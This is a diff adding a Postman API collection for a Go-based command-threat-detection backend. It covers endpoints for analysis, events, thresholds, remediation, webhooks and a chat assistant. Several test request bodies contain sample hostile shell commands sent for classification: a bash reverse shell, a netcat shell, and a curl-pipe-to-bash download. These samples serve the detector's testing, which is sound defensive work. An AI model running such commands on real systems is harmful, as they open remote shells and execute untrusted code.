@@ -1,0 +1,293 @@
+{
+  "info": {
+    "_postman_id": "aegix-go-backend-v2",
+    "name": "AEGIX Go Backend (Phase 5/6)",
+    "description": "Comprehensive Postman collection for the AEGIX Go Backend.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "1. Infrastructure",
+      "item": [
+        {
+          "name": "Health Check",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/healthz", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["healthz"] }
+          }
+        },
+        {
+          "name": "Ready Check",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/readyz", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["readyz"] }
+          }
+        },
+        {
+          "name": "Get Session",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/session", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["session"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "2. Analysis & Detection",
+      "item": [
+        {
+          "name": "Analyze Safe Command",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"ls -la /var/log\",\n  \"process_memory_mb\": 12.5,\n  \"system_memory_percent\": 45.2\n}"
+            },
+            "url": { "raw": "http://localhost:8000/analyze", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["analyze"] }
+          }
+        },
+        {
+          "name": "Analyze Malicious Command",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\n  \"process_memory_mb\": 2.5\n}"
+            },
+            "url": { "raw": "http://localhost:8000/analyze", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["analyze"] }
+          }
+        },
+        {
+          "name": "Analyze Suspicious Command",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"curl -s http://unknown.com/script.sh | bash\"\n}"
+            },
+            "url": { "raw": "http://localhost:8000/analyze", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["analyze"] }
+          }
+        },
+        {
+          "name": "Analyze LLM Explain (Stateless)",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\n  \"classification\": \"malicious\",\n  \"risk_score\": 95,\n  \"matched_rules\": [\"Reverse Shell\"]\n}"
+            },
+            "url": { "raw": "http://localhost:8000/analyze/llm-explain", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["analyze", "llm-explain"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "3. Events & History",
+      "item": [
+        {
+          "name": "Get Events (Limit 20)",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/events?limit=20", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["events"], "query": [ { "key": "limit", "value": "20" } ] }
+          }
+        },
+        {
+          "name": "Get Single Event",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/events/evt_placeholder", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["events", "evt_placeholder"] }
+          }
+        },
+        {
+          "name": "Rule-Based Explain",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/events/evt_placeholder/explain", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["events", "evt_placeholder", "explain"] }
+          }
+        },
+        {
+          "name": "LLM Explain (Event)",
+          "request": {
+            "method": "POST",
+            "url": { "raw": "http://localhost:8000/events/evt_placeholder/llm-explain", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["events", "evt_placeholder", "llm-explain"] }
+          }
+        },
+        {
+          "name": "Agent Event Ingestion",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"nc -e /bin/sh 192.168.1.1 4444\",\n  \"pid\": 1234,\n  \"ppid\": 1233,\n  \"uid\": 1000,\n  \"gid\": 1000,\n  \"argv_str\": \"nc -e /bin/sh 192.168.1.1 4444\",\n  \"comm\": \"nc\",\n  \"agent_id\": \"test-agent-01\"\n}"
+            },
+            "url": { "raw": "http://localhost:8000/agent/events", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["agent", "events"] }
+          }
+        },
+        {
+          "name": "Delete All Events",
+          "request": {
+            "method": "DELETE",
+            "url": { "raw": "http://localhost:8000/events", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["events"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "4. Settings & Metrics",
+      "item": [
+        {
+          "name": "Get Stats",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/stats", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["stats"] }
+          }
+        },
+        {
+          "name": "Get Thresholds",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/settings/thresholds", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["settings", "thresholds"] }
+          }
+        },
+        {
+          "name": "Update Thresholds",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"suspicious_threshold\": 20,\n  \"malicious_threshold\": 50\n}"
+            },
+            "url": { "raw": "http://localhost:8000/settings/thresholds", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["settings", "thresholds"] }
+          }
+        },
+        {
+          "name": "Get Remediation",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/settings/remediation", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["settings", "remediation"] }
+          }
+        },
+        {
+          "name": "Update Remediation",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"enabled\": true,\n  \"mode\": \"kill\",\n  \"signal\": \"SIGKILL\"\n}"
+            },
+            "url": { "raw": "http://localhost:8000/settings/remediation", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["settings", "remediation"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "5. Phase 4 Features (Webhooks/Notifications/Chat/Reports)",
+      "item": [
+        {
+          "name": "Create Webhook",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"https://webhook.site/placeholder-id\",\n  \"trigger_safe\": false,\n  \"trigger_suspicious\": true,\n  \"trigger_malicious\": true\n}"
+            },
+            "url": { "raw": "http://localhost:8000/webhooks", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["webhooks"] }
+          }
+        },
+        {
+          "name": "List Webhooks",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/webhooks", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["webhooks"] }
+          }
+        },
+        {
+          "name": "Delete Webhook",
+          "request": {
+            "method": "DELETE",
+            "url": { "raw": "http://localhost:8000/webhooks/wh_placeholder", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["webhooks", "wh_placeholder"] }
+          }
+        },
+        {
+          "name": "Get Webhook History",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/alerts/history", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["alerts", "history"] }
+          }
+        },
+        {
+          "name": "Get Notifications",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/notifications", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["notifications"] }
+          }
+        },
+        {
+          "name": "Mark All Read",
+          "request": {
+            "method": "POST",
+            "url": { "raw": "http://localhost:8000/notifications/read-all", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["notifications", "read-all"] }
+          }
+        },
+        {
+          "name": "Clear Notifications",
+          "request": {
+            "method": "DELETE",
+            "url": { "raw": "http://localhost:8000/notifications", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["notifications"] }
+          }
+        },
+        {
+          "name": "AI Chat Assistant",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"message\": \"What is a reverse shell?\",\n  \"history\": [\n    {\"role\": \"assistant\", \"content\": \"How can I help you today?\"}\n  ]\n}"
+            },
+            "url": { "raw": "http://localhost:8000/chat", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["chat"] }
+          }
+        },
+        {
+          "name": "Get Departments",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "http://localhost:8000/reports/departments", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["reports", "departments"] }
+          }
+        },
+        {
+          "name": "Add Department",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"name\": \"Test Department\",\n  \"email\": \"test@example.com\"\n}"
+            },
+            "url": { "raw": "http://localhost:8000/reports/departments", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["reports", "departments"] }
+          }
+        },
+        {
+          "name": "Send Email Report",
+          "request": {
+            "method": "POST",
+            "header": [ { "key": "Content-Type", "value": "application/json" } ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"format\": \"html\",\n  \"event_limit\": 10\n}"
+            },
+            "url": { "raw": "http://localhost:8000/reports/email", "protocol": "http", "host": ["localhost"], "port": "8000", "path": ["reports", "email"] }
+          }
+        }
+      ]
+    }
+  ]
+}
